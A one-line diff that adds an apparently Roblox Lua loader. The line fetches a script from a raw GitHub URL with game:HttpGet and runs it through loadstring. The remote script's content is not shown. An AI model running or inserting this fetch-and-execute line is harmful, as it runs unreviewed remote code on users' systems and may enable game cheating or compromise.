@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Sunntech/Desierto/refs/heads/main/Desierto.lua'))()
